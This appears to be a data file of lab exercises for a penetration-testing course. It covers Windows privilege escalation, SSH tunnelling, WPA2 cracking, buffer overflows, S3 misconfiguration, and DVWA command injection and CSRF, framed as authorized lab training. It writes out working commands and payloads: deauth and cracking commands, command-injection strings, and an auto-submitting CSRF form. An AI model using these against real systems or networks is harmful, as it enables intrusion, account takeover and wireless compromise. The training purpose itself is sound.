      `Run WinPEAS or Seatbelt to cross-check your manual findings and confirm you didn't miss anything`,
      `Identify and exploit at least one privesc vector the room provides: an unquoted service path, a weak service ACL, AlwaysInstallElevated, or a SeImpersonatePrivilege token-impersonation exploit (PrintSpoofer/JuicyPotatoNG)`,
      `Confirm you reached SYSTEM with a screenshot of "whoami" showing nt authority\\system`,
      `On two machines you control (e.g. two local VMs, or your host plus a VM), set up an SSH local port forward: ssh -L 8080:internal-service-host:80 user@jumpbox`,
      `Confirm the tunnel works by browsing to http://localhost:8080 on the machine that has no direct route to the internal service, and getting a real response back through the tunnel`,
      `Write 2-3 sentences connecting the two halves: what SYSTEM access on a beachhead host would let you additionally tunnel into on a real internal network`,
    ],
    resources: [
      {
        title: "TryHackMe: Windows PrivEsc",
        url: "https://tryhackme.com/room/windowsprivesc20",
        type: "platform",
      },
      {
        title: "PayloadsAllTheThings — Windows Privilege Escalation",
        url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md",
        type: "link",
      },
      {
        title: "HackTricks — Windows Local Privilege Escalation",
        url: "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html",
        type: "link",
      },
      {
        title: "OpenSSH port forwarding documentation",
        url: "https://man.openbsd.org/ssh#L",
        type: "link",
      },
    ],
    hints: [
      "Before reaching for WinPEAS, manually check services first: `wmic service get name,pathname,startmode` — look for an unquoted path containing a space.",
      "If a SYSTEM-run service's binary is writable by your current user, that's a straightforward swap-the-executable privesc.",
      "SSH's -L syntax is `ssh -L <local_port>:<destination_host>:<destination_port> <user>@<jump_host>` — the destination host/port is resolved from the jump host's network, not yours.",
      "If a Potato-family exploit fails, confirm your current token actually has SeImpersonatePrivilege first with `whoami /priv` before troubleshooting further.",
    ],
  },
  {
    id: "L50",
    number: 50,
    week: 15,
    moduleId: "m19",
    title: "Capture and crack a real WPA2 handshake",
    description:
      "A WPA2 passphrase is only as strong as the wordlist and time available to crack it offline, and the only way to internalize that is to actually run the airmon-ng/airodump-ng/aireplay-ng workflow against a real access point end to end. On your own home network (the only network you're authorized to test this way), you'll enable monitor mode, capture a 4-way handshake by forcing a deauthentication and reassociation, then attempt an offline dictionary crack with aircrack-ng or hashcat. If you don't have a monitor-mode-and-injection-capable wireless adapter, aircrack-ng's own official tutorial ships a real sample handshake capture you can crack instead — the point is the cracking workflow, not where the capture came from.",
    objective:
      "Capture a real WPA2 4-way handshake from your own authorized wireless network and crack the passphrase offline with a dictionary attack.",
    successCriteria: [
      "Enable monitor mode and identify the target access point's BSSID and channel",
      "Force a handshake via deauthentication and confirm airodump-ng reports a captured WPA handshake",
      "Crack the passphrase from the capture with aircrack-ng or hashcat using a wordlist (or the official sample capture if no compatible adapter is available)",
      "Explain why success depends on the wordlist rather than on breaking WPA2's cryptography",
    ],
    platform: "Aircrack-ng",
    difficulty: "medium",
    estimatedHours: 2,
    completionIndicator:
      "Terminal screenshot showing airodump-ng capturing a WPA handshake ('WPA handshake:' message) and a second screenshot showing aircrack-ng or hashcat successfully recovering the passphrase from that capture.",
    instructions: [
      `Confirm you're testing your own home network (or another network you own/are explicitly authorized to test) — this workflow only ever targets a network you have permission for`,
      `Enable monitor mode on a capable wireless adapter: sudo airmon-ng start wlan0`,
      `Identify your target AP's BSSID and channel: sudo airodump-ng wlan0mon`,
      `Start a focused capture on that BSSID/channel, writing to a file: sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon`,
      `In a second terminal, send a handful of deauth frames to force a client to reassociate and produce a fresh handshake: sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon`,
      `Confirm airodump-ng's header shows "WPA handshake:" once the reassociation is captured`,
      `If you don't have a monitor-mode-capable adapter, download aircrack-ng's own official tutorial sample capture instead and use that for the remaining steps`,
      `Attempt to crack the captured handshake with a wordlist: aircrack-ng -w wordlist.txt capture-01.cap`,
      `As a second method, convert the capture and try hashcat mode 22000: hcxpcapngtool -o capture.hc22000 capture-01.cap, then hashcat -m 22000 capture.hc22000 wordlist.txt`,
      `Write 2-3 sentences on why this is fundamentally a dictionary-attack problem (success depends entirely on the passphrase being in your wordlist) rather than a break of WPA2's cryptography itself`,
    ],
    resources: [
      {
        title: "Aircrack-ng official documentation",
        url: "https://www.aircrack-ng.org/documentation.html",
        type: "link",
      },
      {
        title: "Aircrack-ng (GitHub)",
        url: "https://github.com/aircrack-ng/aircrack-ng",
        type: "tool",
      },
      { title: "hashcat", url: "https://hashcat.net/hashcat/", type: "tool" },
      {
        title: "hcxtools (GitHub)",
        url: "https://github.com/ZerBea/hcxtools",
        type: "tool",
      },
    ],
    hints: [
      "No monitor-mode-capable adapter? Skip straight to aircrack-ng's own official tutorial sample capture — the cracking workflow afterward is identical either way.",
      "airodump-ng won't print \"WPA handshake:\" until a client actually reassociates — that's exactly why the deauth step exists.",
      "A dictionary crack is only as good as the wordlist. If your first attempt fails, try a well-known list like rockyou.txt before assuming the workflow itself is broken.",
      "If hcxpcapngtool errors out on the format conversion, confirm hcxtools is actually installed before troubleshooting the capture file.",
    ],
  },
  {
    id: "L51",
    number: 51,
    week: 16,
    moduleId: "m21",
    title: "Write a professional report for your capstone engagement",
    description:
      "Every skill this programme built only counts once it survives being handed to someone who never saw you run a single command — which is exactly the test this lab applies to your own L38 capstone results. You'll CVSS-score each finding you produced (not just call it 'critical' by feel), write one real executive-summary paragraph aimed at a non-technical sponsor, and structure at least one finding through the full anatomy: title, score, affected asset, description, real evidence, exact reproduction steps, and remediation guidance specific enough for a developer to act on without asking you a follow-up question. This is the same deliverable a real engagement is judged by, built from your own real findings rather than a template.",
    objective:
      "Write a professional penetration-test report for your L38 capstone findings, including CVSS scoring, an executive summary, and one fully detailed technical finding.",
    successCriteria: [
      "Calculate a CVSS v3.1 base score for each capstone finding by walking through its metric groups rather than assigning severity by feel",
      "Write an executive-summary paragraph describing business risk and impact for a non-technical sponsor",
      "Fully document the highest-severity finding: title, score, affected asset, description, real evidence, reproduction steps, and specific remediation guidance",
      "Proofread for overly technical language and confirm every claim in the report is backed by real evidence",
    ],
    platform: "Written Deliverable",
    difficulty: "medium",
    estimatedHours: 4,
    completionIndicator:
      "A written report document containing: an executive summary paragraph, a CVSS v3.1 vector string and score for each capstone finding, and at least one fully-structured technical finding with reproduction steps and remediation guidance.",
    instructions: [
      `Gather your findings from the L38 capstone simulation — every vulnerability, misconfiguration, or foothold you documented during that 48-hour window`,
      `For each finding, work out its CVSS v3.1 base score by walking through the metric groups (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and the CIA impact triad) rather than assigning a severity by feel`,
      `Write one executive-summary paragraph aimed at a non-technical sponsor: business risk and impact, not technique or tool names`,
      `Pick your single highest-severity finding and write it up with the full anatomy: title, CVSS score, affected asset, plain-language description, real evidence (a screenshot or the actual request/response pair), exact numbered reproduction steps, and remediation guidance specific enough for a developer to act on directly`,
      `Re-read your own remediation guidance and check it isn't generic advice like "improve input validation" — rewrite it if it is`,
      `Assign a realistic remediation timeframe to that finding, tied to its severity`,
      `Proofread for over-technical language a non-technical reader wouldn't follow, and confirm every claim in the report has real evidence behind it`,
    ],
    resources: [
      {
        title: "FIRST.org CVSS v3.1 Specification",
        url: "https://www.first.org/cvss/v3-1/specification-document",
        type: "link",
      },
      {
        title: "TCM Security sample pentest report",
        url: "https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report",
        type: "link",
      },
      {
        title: "SANS Reading Room",
        url: "https://www.sans.org/white-papers/",
        type: "link",
      },
    ],
    hints: [
      "Start CVSS scoring from Attack Vector — is exploitation possible over the Network, or does it need Local/Physical access? That one choice usually anchors most of the rest of the score.",
      '"Improve input validation" is not a remediation. Name the exact library, parameter, or config setting the developer should actually change.',
      "A non-technical executive doesn't know what XSS or a CVSS score means — describe business impact and risk instead of technique or tool names.",
      "Write up your own highest-severity finding from the actual L38 capstone — don't invent a new one you didn't find during that engagement.",
    ],
  },
  {
    id: "L52",
    number: 52,
    week: 15,
    moduleId: "m18",
    title: "TryHackMe: Buffer Overflow Prep",
    description:
      "The offset-crash-EIP-badchars-shellcode methodology this module teaches only sticks once you've run it against a real binary that actually crashes the way the theory predicts. TryHackMe's 'Buffer Overflow Prep' room provides exactly that: a real vulnerable Windows application and Immunity Debugger environment, walking the same sequence this module's topics cover in order — fuzz to find the crash, find the exact offset with a cyclic pattern, confirm EIP control, run the full bad-character sweep, locate a JMP ESP with no bad characters in it, then generate and land working shellcode. Completing it end to end is the practical proof that the methodology, not memorized steps against one specific binary, is what you actually walked away with.",
    objective:
      "Run the full buffer-overflow exploitation methodology — fuzzing, offset discovery, EIP control, bad-character analysis, finding a JMP ESP, and shellcode delivery — against a real vulnerable Windows application to obtain a working shell.",
    successCriteria: [
      "Fuzz the application to trigger a crash, then find the exact EIP offset using a cyclic pattern",
      "Confirm precise EIP control with distinct marker bytes",
      "Run a full bad-character sweep and locate a JMP ESP instruction free of those bad characters",
      "Generate shellcode excluding the bad characters and obtain a working reverse shell through the completed exploit chain",
    ],
    platform: "TryHackMe",
    difficulty: "hard",
    estimatedHours: 4,
    completionIndicator:
      "Screenshot of a working reverse shell obtained via the completed exploit chain (fuzz -> offset -> EIP control -> bad chars -> JMP ESP -> shellcode), plus a screenshot of Immunity Debugger showing EIP fully controlled by your marker bytes.",
    instructions: [
      `Deploy TryHackMe's "Buffer Overflow Prep" room and connect to the provided Windows VM via RDP`,
      `Attach Immunity Debugger (with the mona.py plugin configured) to the vulnerable application and confirm you can trigger a crash by sending a large, obviously-oversized input`,
      `Generate a cyclic pattern with msf-pattern_create (or pattern_create.rb) at a length comfortably past your crash length, send it, and read the crashed EIP value`,
      `Find the exact offset into your buffer that lands in EIP with msf-pattern_offset (or pattern_offset.rb)`,
      `Confirm EIP control precisely: send a buffer with your exact offset of junk bytes, then 4 distinct marker bytes, and confirm EIP shows exactly those 4 bytes`,
      `Run the full bad-character sweep: send the entire 0x00-0xFF byte range after your offset, then use !mona compare (or manual inspection of the stack dump) to find which bytes got mangled or truncated`,
      `Find a JMP ESP instruction with none of your bad characters in its address, from a loaded module with no memory protections, using !mona jmp -r esp -cpb "<your bad chars>"`,
      `Generate shellcode with msfvenom, excluding your confirmed bad characters, and place it after a small NOP sled following your JMP ESP address in the buffer`,
      `Set up a listener and send the final exploit; confirm you receive a working shell back`,
    ],
    resources: [
      {
        title: "TryHackMe: Buffer Overflow Prep",
        url: "https://tryhackme.com/room/bufferoverflowprep",
        type: "platform",
      },
      {
        title: "corelan.be — Exploit Writing Tutorials",
        url: "https://www.corelan.be",
        type: "link",
      },
      {
        title: "Metasploit Framework (GitHub)",
        url: "https://github.com/rapid7/metasploit-framework",
        type: "tool",
      },
      {
        title: "mona.py (corelan-consulting)",
        url: "https://github.com/corelan/mona",
        type: "tool",
      },
    ],
    hints: [
      "Don't guess your crash length — send increasingly large buffers until you find the smallest one that reliably crashes the app, then build your cyclic pattern from there.",
      "Your cyclic pattern needs to be longer than the crash length you found, or pattern_offset's calculation comes out wrong.",
      "Not every byte value is automatically \"bad\" — the sweep isn't guesswork; compare mona's memory dump against exactly what you sent to see which bytes actually got mangled or truncated.",
      "If your exploit still doesn't land after finding a JMP ESP, double-check that module has no memory protections (ASLR/DEP) — mona's -cpb filter should already exclude bad ones, but it's worth confirming.",
    ],
  },
  {
    id: "L53",
    number: 53,
    week: 16,
    moduleId: "m20",
    title: "LocalStack: AWS S3 Misconfiguration Walkthrough (Local)",
    description:
      "LocalStack is a well-known, self-contained AWS emulator you run entirely in Docker -- it stands up local implementations of S3, EC2, and dozens of other AWS APIs behind the same edge port, with no real AWS account, billing, or internet-facing bucket involved. This lab has you start a LocalStack container, point the real AWS CLI at it with --endpoint-url, and then build the exact misconfiguration flAWS.cloud is famous for teaching: an S3 bucket with a public-read/public-list policy that lets anyone -- with zero credentials -- enumerate and download its contents. Because you create the misconfiguration yourself before exploiting it, you see both sides of the same bug that leaks real production data constantly: the one-line bucket policy that causes it, and the anonymous aws s3 ls / s3 cp --no-sign-request commands that exploit it.",
    objective:
      "Start a local LocalStack AWS emulator, deliberately misconfigure an S3 bucket with a public-read policy, then anonymously enumerate and exploit it with the AWS CLI -- the same S3-misconfig lesson flAWS.cloud teaches, run entirely against a local target.",
    successCriteria: [
      "LocalStack container running and reachable via the AWS CLI at --endpoint-url http://localhost:18080",
      'An S3 bucket created and given a public-read/public-list bucket policy (Principal "*") on purpose',
      "The bucket's contents listed anonymously with aws s3 ls ... --no-sign-request",
      "A file downloaded anonymously with aws s3 cp ... --no-sign-request, plus one paragraph naming the misconfiguration and its fix",
    ],
    platform: "LocalStack (Docker)",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "Terminal output showing the bucket policy JSON applied, then an anonymous `aws s3 ls s3://<bucket> --no-sign-request --endpoint-url http://localhost:18080` listing the bucket's contents and an anonymous `aws s3 cp` downloading a file from it, with no credentials configured for either command.",
    dockerImage: "localstack/localstack",
    containerPort: 4566,
    instructions: [
      `Click 'Start Lab' above to launch LocalStack -- the portal maps its edge port (4566, which serves every emulated AWS API) to http://localhost:18080`,
      `Configure the AWS CLI with dummy credentials LocalStack accepts by default: export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1`,
      `Create a bucket against the local endpoint: aws --endpoint-url=http://localhost:18080 s3 mb s3://flaws-local`,
      `Upload a "secret" file to it: echo 'this should not be public' > secret.txt && aws --endpoint-url=http://localhost:18080 s3 cp secret.txt s3://flaws-local/secret.txt`,
      `Deliberately misconfigure the bucket with a public-read policy: save a policy.json granting {"Effect":"Allow","Principal":"*","Action":["s3:GetObject","s3:ListBucket"],"Resource":["arn:aws:s3:::flaws-local","arn:aws:s3:::flaws-local/*"]}, then apply it with aws --endpoint-url=http://localhost:18080 s3api put-bucket-policy --bucket flaws-local --policy file://policy.json`,
      `Confirm the misconfiguration anonymously, with no credentials configured at all: aws --endpoint-url=http://localhost:18080 s3 ls s3://flaws-local --no-sign-request`,
      `Exploit it: download the file anonymously with aws --endpoint-url=http://localhost:18080 s3 cp s3://flaws-local/secret.txt - --no-sign-request`,
      `Write one paragraph naming the exact misconfiguration (a bucket policy with Principal "*" granting s3:ListBucket/s3:GetObject) and the real-world fix (remove the public principal, or enable S3 Block Public Access)`,
    ],
    resources: [
      {
        title: "LocalStack documentation",
        url: "https://docs.localstack.cloud/",
        type: "link",
      },
      {
        title: "AWS CLI documentation",
        url: "https://docs.aws.amazon.com/cli/",
        type: "link",
      },
      {
        title: "AWS S3: Using bucket policies",
        url: "https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html",
        type: "link",
      },
      {
        title: "AWS S3: Blocking public access",
        url: "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
        type: "link",
      },
      {
        title: "flaws.cloud (optional extra practice)",
        url: "http://flaws.cloud",
        type: "platform",
      },
    ],
    hints: [
      'If --no-sign-request still gets Access Denied, re-check the bucket policy JSON -- Principal must be "*" and Action must include both s3:ListBucket (for the bucket ARN) and s3:GetObject (for the object ARN with /*).',
      "Every AWS CLI command against LocalStack needs --endpoint-url=http://localhost:18080, or it will try to reach real AWS instead of your local container.",
      "The dummy AWS_ACCESS_KEY_ID=test / AWS_SECRET_ACCESS_KEY=test credentials are only needed for the bucket-owner commands (mb, cp upload, put-bucket-policy) -- the whole point of the exploit step is that the ls/cp download works with --no-sign-request and no credentials at all.",
    ],
  },
  {
    id: "L54",
    number: 54,
    week: 9,
    moduleId: "m9",
    title: "Command Injection on DVWA",
    description:
      "OS command injection happens the moment user input reaches a shell without being separated from the command it's concatenated into -- DVWA's Command Injection module is a textbook case: an 'ip' field is passed straight to a ping command, and the shell metacharacters ; | && let you chain your own command onto the end of it. This lab walks the same payload-evolution pattern as the rest of the DVWA modules: raw separator injection at Low, adapting to Medium's narrow (but incomplete) blacklist of the literal strings '&&' and ';', then to High's stricter blacklist that still leaves a documented gap in how it filters the pipe character. You'll finish by triggering the injected command blind -- using a time-delay payload to confirm execution when the response gives you no visible output -- the same technique real out-of-band command injection relies on when there's no reflected result to read.",
    objective:
      "Exploit OS command injection in DVWA's Command Injection module across Low, Medium, and High security levels using the exact separator each level's filter misses, then confirm blind execution with a time-delay payload.",
    successCriteria: [
      "Command output (e.g. whoami, id) appended to the ping result at Low security using a ; | or && separator",
      "The same injection still works at Medium by using a separator that DVWA's '&&'/';' string-blacklist never filters",
      "The same injection still works at High by exploiting the documented gap in its pipe-character filtering",
      "A time-delay payload (e.g. sleep 5) demonstrates blind command execution, with the observed delay explained as an out-of-band confirmation technique",
    ],
    platform: "DVWA (Docker)",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080, log in with admin:password, click 'Create / Reset Database' if this is a fresh instance, open DVWA Security and set the level to Low, then open the Command Injection module`,
      `Low: submit 127.0.0.1; whoami (or 127.0.0.1 && whoami, 127.0.0.1 | whoami) in the IP field and confirm the injected command's output is appended below the ping result`,
      `Set Security to Medium. DVWA's medium filter only strips the literal substrings '&&' and ';', leaving the pipe character untouched -- submit 127.0.0.1 | whoami and confirm the same injection still works unmodified`,
      `Set Security to High. The filter now blacklists a longer list including '| ' (pipe followed by a space) -- submit 127.0.0.1|whoami with no space after the pipe and confirm the filter's exact-string match misses it`,
      `Set Security to Impossible and retry the same payload -- confirm it now fails because DVWA splits the input on '.' and requires all four octets to pass is_numeric() before rebuilding and using the IP, so any shell metacharacter breaks the numeric check and gets rejected outright; write one sentence naming that control`,
      `Back at Low or Medium, submit a time-delay payload such as 127.0.0.1 | sleep 5 and time the response to confirm the command executed even with no distinguishing output -- this is the same blind-confirmation technique used when a real target's response gives no visible result`,
      `Write 2-3 sentences on how the same time-delay technique generalizes to out-of-band command injection (e.g. triggering an outbound DNS lookup or HTTP request to an attacker-controlled listener) when a target has neither reflected output nor a timing side-channel to lean on directly`,
    ],
    resources: [
      {
        title: "DVWA (Damn Vulnerable Web Application) source repo",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA official container image (GitHub Container Registry)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "OWASP: Command Injection",
        url: "https://owasp.org/www-community/attacks/Command_Injection",
        type: "link",
      },
      {
        title: "OWASP OS Command Injection Defense Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `Screenshots showing the injected command's output (e.g. a whoami/id result) appended below the ping output at Low, Medium, and High security, plus a timed response showing an observed ~5 second delay from a sleep-based payload demonstrating blind execution.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Stand up DVWA and reach Command Injection",
        body: "The DVWA container (ghcr.io/digininja/dvwa:latest, container port 80) is started, you log in with admin:password, and open the Command Injection module -- an IP field that's passed straight into a shell ping command.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Low: any separator chains your command",
        body: "127.0.0.1; whoami (or && or |) appends your command's output directly below the ping result -- the IP field is concatenated into the shell command with no filtering at all.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "DVWA (Low)",
          exchanges: [
            {
              direction: "right",
              label: "IP field",
              payload: "127.0.0.1; whoami",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "ping output + whoami result",
            },
          ],
        },
      },
      {
        title: "Each level's filter has a gap",
        body: "Medium only strips the literal strings '&&' and ';', so a bare pipe | is never touched. High adds more separators to the blacklist, but matches the exact string '| ' (pipe plus space) -- so a pipe with no trailing space, 127.0.0.1|whoami, slips through untouched.",
        diagram: {
          type: "layer-stack",
          layers: [
            { label: "Low", detail: "no filtering -- any separator works" },
            {
              label: "Medium",
              detail: "'&&' and ';' stripped -- pipe | still works",
            },
            {
              label: "High",
              detail:
                "'| ' (pipe+space) blocked -- pipe with no space still works",
              highlighted: true,
            },
            {
              label: "Impossible",
              detail:
                "all 4 octets must pass is_numeric() -- no metacharacters survive",
            },
          ],
        },
      },
      {
        title: "Impossible: real input handling, not a blacklist",
        body: "The same payloads fail at Impossible because DVWA splits the submitted value on '.' and requires all four octets to pass is_numeric() before rebuilding the IP and passing it to the ping command -- any shell metacharacter breaks the numeric check and never reaches the shell at all, a fundamentally different fix than string-blacklisting separators.",
      },
      {
        title: "Confirm execution blind, with timing",
        body: "127.0.0.1 | sleep 5 produces no distinguishing output, so you confirm the command actually ran by timing the response -- if it takes ~5 seconds longer than a normal request, the injected command executed even though nothing came back to read.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "time curl 'http://localhost:18080/vulnerabilities/exec/' --data 'ip=127.0.0.1|sleep 5'",
            },
            { output: "real 0m5.2s" },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Real command injection is rarely as forgiving as Low -- production filters usually resemble Medium or High's incomplete blacklists, and a real target often reflects nothing back at all. The same separator-hunting and timing-confirmation technique you just ran is exactly how blind and out-of-band command injection gets found and proven on a live target with no visible output channel.",
      },
    ],
    hints: [
      "At Low, the IP field is concatenated straight into a shell ping command with zero filtering -- any of ; | && will chain your own command onto the end (step 2).",
      "At Medium, only the literal strings '&&' and ';' get stripped -- a bare pipe character was never on that blacklist, so your Low payload still works if you swap the separator (step 3). At High, the blacklist adds '| ' but matches that exact two-character string, so a pipe with no space after it slips through (step 4).",
      "For the blind step, pick a payload with no visible side effect -- like sleep 5 -- and measure how long the response takes instead of reading its body; a ~5 second delay proves the command ran even with nothing readable in the output (step 6).",
    ],
  },
  {
    id: "L55",
    number: 55,
    week: 9,
    moduleId: "m9",
    title: "CSRF on DVWA",
    description:
      "Cross-site request forgery works because a browser will happily attach a victim's session cookie to a request the victim never intended to send -- DVWA's CSRF module changes a logged-in user's password through a plain GET request with zero anti-CSRF protection at Low, which means any page the victim's browser loads can trigger it. This lab has you craft a standalone, auto-submitting HTML page that forges that exact password-change request, host it outside DVWA, and load it while still logged in as the victim to prove the forged state change actually lands -- no phishing link click needed beyond the page simply loading. You'll then raise DVWA's security level and see the Referer-substring check Medium adds, and why it's still a weak defense compared to the session-bound token Impossible finally introduces.",
    objective:
      "Craft and host a self-submitting HTML form that forges DVWA's password-change request via CSRF at Low security, confirm the victim's password actually changes, then compare how Medium's Referer check and Impossible's CSRF token close the same hole.",
    successCriteria: [
      "The normal password-change request format is confirmed as a GET request with no token parameter at Low security",
      "A standalone, auto-submitting HTML page is built and hosted outside DVWA that reproduces that exact request",
      "Loading the page while logged into DVWA silently changes the account password, confirmed by logging out and back in with the new password",
      "One sentence names the exact control that defeats the forged request at Medium (Referer substring check) and at Impossible (session-bound CSRF token)",
    ],
    platform: "DVWA (Docker)",
    difficulty: "easy",
    estimatedHours: 2,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080, log in with admin:password, set DVWA Security to Low, and open the CSRF module`,
      `Change your password once through the normal form and, with your browser's network tab or Burp, confirm the exact request it sends: a GET to /vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change with no CSRF token in it at all`,
      `Create a standalone HTML file (host it with a simple local server, e.g. python -m http.server, or open it directly as a file) containing an auto-submitting form: <form action="http://localhost:18080/vulnerabilities/csrf/" method="GET"><input type="hidden" name="password_new" value="pwned123"><input type="hidden" name="password_conf" value="pwned123"><input type="hidden" name="Change" value="Change"></form><script>document.forms[0].submit()</script>`,
      `While still logged into DVWA in the same browser (standing in for the victim), open your malicious HTML page directly and watch it auto-submit with no visible confirmation dialog`,
      `Log out of DVWA and log back in using the forged password (pwned123) to prove the forged state change actually took effect`,
      `Set Security to Medium and repeat the same forged form -- note DVWA now checks whether the Referer header contains the app's own hostname substring, and explain in one sentence why that's a weak check rather than a real fix`,
      `Set Security to Impossible and repeat the same forged form once more -- confirm it now fails because the real form embeds a per-session user_token and also requires the current password, and write one sentence naming that control`,
    ],
    resources: [
      {
        title: "DVWA (Damn Vulnerable Web Application) source repo",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA official container image (GitHub Container Registry)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "OWASP: Cross-Site Request Forgery (CSRF)",
        url: "https://owasp.org/www-community/attacks/csrf",
        type: "link",
      },
      {
        title: "OWASP CSRF Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `A screenshot of the standalone malicious HTML page's source, a screenshot of it auto-submitting while logged into DVWA, and a screenshot of successfully logging back into DVWA with the forged password -- proving the victim's account state changed from a page hosted entirely outside DVWA.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Find the unprotected request",
        body: "At Low security, changing your DVWA password sends a plain GET request with password_new, password_conf, and Change parameters and no CSRF token at all -- anything that can make your browser load that URL can trigger it.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Build the forged page, off DVWA entirely",
        body: "A standalone HTML file with a hidden form pointed at DVWA's CSRF endpoint, auto-submitted by a one-line script the instant the page loads -- hosted on your own machine, never touching DVWA's own code.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Attacker crafts page",
              detail: "auto-submitting form → DVWA's password-change URL",
            },
            {
              label: "Attacker hosts it",
              detail: "any URL the victim's browser can load",
            },
            {
              label: "Victim (still logged in) opens it",
              detail: "browser attaches DVWA session cookie automatically",
            },
            {
              label: "Form auto-submits",
              detail: "no click, no visible confirmation",
            },
            {
              label: "DVWA changes the password",
              detail: "request looks identical to a real user action",
            },
          ],
        },
      },
      {
        title: "The victim's browser does the rest",
        body: "While logged into DVWA, opening the malicious page makes the browser silently send the forged request with the real session cookie attached -- from DVWA's side, it's indistinguishable from the victim clicking Change themselves.",
        diagram: {
          type: "browser-mockup",
          url: "file:///csrf-poc.html",
          annotations: [
            {
              label: "No visible UI",
              note: "the page is blank -- the form submits itself on load",
            },
            {
              label: "Session cookie attached automatically",
              note: "the browser sends it because the request targets DVWA's own origin",
            },
          ],
        },
      },
      {
        title: "Prove the forged state change",
        body: "Log out and log back in with the forged password -- if it works, the CSRF attack didn't just fire a request, it actually changed persistent account state.",
      },
      {
        title: "Medium and Impossible close it differently",
        body: "Medium checks that the Referer header merely contains the app's own hostname somewhere in it -- a weak substring check, not a real defense. Impossible embeds a random, session-bound user_token in the real form and also requires the current password, so an attacker who can't read the victim's page has no way to forge a valid request at all.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "Low",
              points: [
                "no token",
                "no Referer check",
                "forged form works unmodified",
              ],
            },
            {
              label: "Medium",
              points: [
                "Referer must contain hostname substring",
                "weak, often bypassable",
              ],
            },
            {
              label: "Impossible",
              points: [
                "per-session user_token required",
                "current password required",
                "forged form has no valid token to send",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "CSRF is entirely a browser-trust problem, not a server-input problem -- the payload here isn't malicious data, it's a legitimate-looking request sent from the wrong place. That's exactly why the real fix is a token an attacker's page can never know, not a check on where the request appears to come from.",
      },
    ],
    hints: [
      "First confirm the exact GET request DVWA's own password-change form sends at Low security -- your forged form just needs to reproduce that same URL and parameters exactly (step 2).",
      "Your malicious HTML page needs zero DVWA code -- it's a hidden form pointed at DVWA's own URL, submitted automatically with a single-line script the instant the page loads, hosted completely outside DVWA (step 3).",
      "The forged page only works because the victim's browser is still logged into DVWA when it loads -- open it in the same browser session where you're logged in, then prove it worked by logging out and back in with the new forged password (steps 4-5).",
    ],
  },
  {
    id: "L56",
    number: 56,
    week: 10,
    moduleId: "m10",
    title: "XXE (XML External Entity) on WebGoat",
    description:
      "XML parsers that resolve DOCTYPE-declared external entities by default turn any feature that accepts XML input into a way to read files off the server's own filesystem -- WebGoat's XXE lesson category teaches exactly that failure mode against a feature that normally exchanges data as XML. You'll intercept a request, inject a DOCTYPE with a SYSTEM entity pointing at a local file, and get its contents reflected back through a field that was never meant to expose the filesystem. The lesson then pushes further into blind XXE, where the response never reflects the file's contents directly, so proving the vulnerability means reasoning about out-of-band confirmation instead of reading an answer straight off the page -- the same escalation real-world XXE findings go through once developers patch the obvious reflected case but miss the underlying parser configuration.",
    objective:
      "Exploit WebGoat's XXE lesson by injecting a DOCTYPE with a SYSTEM entity to read a local file through direct reflection, then work the lesson's blind/out-of-band XXE exercise where the response gives no direct answer to read.",
    successCriteria: [
      "Registered a WebGoat account and opened the XXE lesson category",
      "Submitted a crafted XML body with a DOCTYPE SYSTEM entity and had its resolved content reflected back in the response",
      "Worked through the lesson's blind/out-of-band XXE exercise where the file's content is never directly reflected",
      "WebGoat's lesson tracker shows a green 'Solved' indicator on the completed XXE stages",
    ],
    platform: "WebGoat (Docker)",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path -- and register your own account (or log in with the account from an earlier WebGoat lab)`,
      `Open the 'XXE' lesson category and read through its explanation of how a standard XML parser resolves a DOCTYPE-declared external entity by default, unless the application explicitly disables that behavior`,
